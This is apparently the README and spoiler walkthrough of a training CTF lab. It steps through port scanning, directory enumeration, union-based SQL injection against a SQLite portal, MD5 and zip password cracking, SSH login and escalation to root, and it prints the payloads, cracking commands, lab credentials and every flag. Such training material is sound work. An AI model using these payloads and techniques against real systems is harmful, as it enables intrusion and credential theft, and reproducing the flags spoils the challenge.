# sqli_ssh_lab1 — Web SQLi + SSH + Zip + Privesc

Four-flag CTF lab covering: recon → directory enumeration → union-based SQL injection → hash cracking → SSH → zip cracking → privilege escalation.

## Start

```bash
docker compose up --build
```

- Web: `http://localhost:8081`
- SSH: `localhost:22`

## Flags

| # | Flag | Technique |
|---|------|-----------|
| 1 | `SMC{P4TH_FINDER}` | Directory enumeration (gobuster) |
| 2 | `SMC{UNI0N_BASED_CRACKED}` | Union-based SQLi + MD5 hash cracking |
| 3 | `SMC{ZIP_CRACKED}` | Zip password cracking |
| 4 | `SMC{HIDDEN_ROOT}` | Privilege escalation + hidden file discovery |

## Tools Needed

- `nmap`
- `gobuster` + `/usr/share/wordlists/dirb/big.txt`
- `curl` or Burp Suite
- `hashcat` or `john` + `rockyou.txt`
- `zip2john` (from `john` package)
- `ssh`

---

## Walkthrough

<details>
<summary>⚠️ Spoilers — expand only if stuck</summary>

---

### Step 1 — Recon: Port Scan

Scan the target to discover running services:

```bash
nmap -sV <TARGET>
```

Expected output:
```
22/tcp  open  ssh     OpenSSH 8.9
80/tcp  open  http    Apache httpd 2.4
```

Visit `http://<TARGET>` — looks like a company homepage with nothing interesting.

---

### Step 2 — Web Enumeration: Find the Hidden Path

Use gobuster with a large wordlist to discover hidden directories:

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/big.txt -x php
```

Expected output:
```
/search               (Status: 301)
/search/index.php     (Status: 200)
```

Visit `http://<TARGET>/search` — an internal employee lookup portal.

**Flag 1: `SMC{P4TH_FINDER}`** is displayed on the page. ✓

---

### Step 3 — Exploitation: Union-Based SQL Injection

The portal has an `id` parameter: `/search/index.php?id=1`

**Probe the query:** try breaking it first:

```
/search/index.php?id=1'
```

If output disappears or you see an error, the parameter is injectable.

**Determine column count:** the original query returns 2 columns (name, department):

```bash
curl "http://<TARGET>/search/index.php?id=0 UNION SELECT 1,2--"
```

Returns: `1 | 2` — confirms 2-column output.

**Enumerate databases/schemas:**

> This lab uses SQLite. SQLite has no `information_schema` — use `sqlite_master` instead.

```bash
# List all tables
curl "http://<TARGET>/search/index.php?id=0 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--"
```

Returns something like:
```
employees | CREATE TABLE employees (id INTEGER, name TEXT, department TEXT, username TEXT, password TEXT)
```

**Enumerate columns** (already revealed by the `sql` field above, but explicitly):

```bash
# Read schema of a specific table
curl "http://<TARGET>/search/index.php?id=0 UNION SELECT sql,1 FROM sqlite_master WHERE type='table' AND name='employees'--"
```

Returns:
```
CREATE TABLE employees (id INTEGER, name TEXT, department TEXT, username TEXT, password TEXT)
```

Now you know the column names. **Extract credentials:**

```bash
curl "http://<TARGET>/search/index.php?id=0 UNION SELECT username,password FROM employees--"
```

Returns:
```
john | 0571749e2ac330a7455809c6b0e7af90
```

You now have a username (`john`) and an MD5 password hash.

---

### Step 4 — Credential Cracking: Break the MD5 Hash

Save the hash to a file and crack it:

```bash
echo "0571749e2ac330a7455809c6b0e7af90" > hash.txt

# Using hashcat (mode 0 = raw MD5)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Or using john
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
```

Cracked password: `sunshine`

---

### Step 5 — SSH Access + Flag 2

Log in via SSH using the cracked credentials:

```bash
ssh john@<TARGET> -p 22
# Password: sunshine
```

Once inside:

```bash
ls
cat flag.txt
```

**Flag 2: `SMC{UNI0N_BASED_CRACKED}`** ✓

---

### Step 6 — Zip Cracking: Flag 3

You also see `secret.zip` in the home directory. Transfer and crack it:

**On the target (or copy it out first):**

```bash
# Extract the hash from the zip
zip2john secret.zip > zip.hash

# Crack with john
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked zip password: `master123`

**Unzip and read contents:**

```bash
unzip -P master123 secret.zip
cat zipsrc/flag.txt
```

**Flag 3: `SMC{ZIP_CRACKED}`** ✓

Also read the other file inside:

```bash
cat zipsrc/admin_credentials.txt
```

```
Admin Credentials
-----------------
Username: root
Password: R00t@SecureLab2024!
```

---

### Step 7 — Privilege Escalation + Flag 4

Use the credentials from the zip to switch to root:

```bash
su root
# Password: R00t@SecureLab2024!
```

You are now root. The flag is a **hidden file** (starts with `.` — not visible with plain `ls`):

```bash
ls -la /root/
cat /root/.flag.txt
```

**Flag 4: `SMC{HIDDEN_ROOT}`** ✓

---

### Summary

| Step | Command | Result |
|------|---------|--------|
| Port scan | `nmap -sV <TARGET>` | SSH + HTTP discovered |
| Dir enum | `gobuster dir ... -x php` | `/search` found |
| SQLi enum | `?id=0 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--` | tables + columns revealed |
| SQLi dump | `?id=0 UNION SELECT username,password FROM employees--` | `john:0571749e2ac330a7455809c6b0e7af90` |
| Hash crack | `hashcat -m 0 hash.txt rockyou.txt` | `sunshine` |
| SSH | `ssh john@<TARGET>` | Flag 2 + secret.zip |
| Zip crack | `zip2john` + `john` | `master123`, Flag 3, root creds |
| Privesc | `su root` → `cat /root/.flag.txt` | Flag 4 |

</details>
